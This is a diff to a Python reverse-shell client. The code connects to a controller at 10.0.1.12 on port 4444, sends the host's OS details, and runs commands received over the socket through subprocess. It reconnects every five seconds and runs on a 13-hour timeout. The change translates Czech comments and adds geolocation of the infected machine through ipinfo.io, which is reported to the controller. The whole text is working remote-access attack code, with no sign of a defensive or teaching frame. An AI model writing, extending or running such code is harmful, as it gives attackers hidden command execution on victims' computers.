@@ -3,14 +3,24 @@ import platform
 import subprocess
 import time
 import os
+import requests
 
-SERVER_IP = '10.0.1.12'  # Změň na IP serveru
+SERVER_IP = '10.0.1.12'  # Replace with the server's IP
 PORT = 4444
 RECONNECT_INTERVAL = 5
-TIMEOUT = 60 * 60 * 13  # 13 hodin
+TIMEOUT = 60 * 60 * 13  # 13 hours
 
 def get_os_info():
     return platform.platform()
+
+def get_country_info():
+    try:
+        response = requests.get("https://ipinfo.io")
+        data = response.json()
+        country = data.get("country", "Unknown")
+        return country
+    except Exception as e:
+        return f"Error fetching country: {str(e)}"
 
 def execute_command(cmd):
     try:
@@ -25,7 +35,10 @@ def connect():
         try:
             s = socket.socket()
             s.connect((SERVER_IP, PORT))
-            s.send(get_os_info().encode())
+            os_info = get_os_info()
+            country_info = get_country_info()
+            client_info = f"{os_info}\nCountry: {country_info}"
+            s.send(client_info.encode())
             while True:
                 cmd = s.recv(1024).decode()
                 if not cmd:
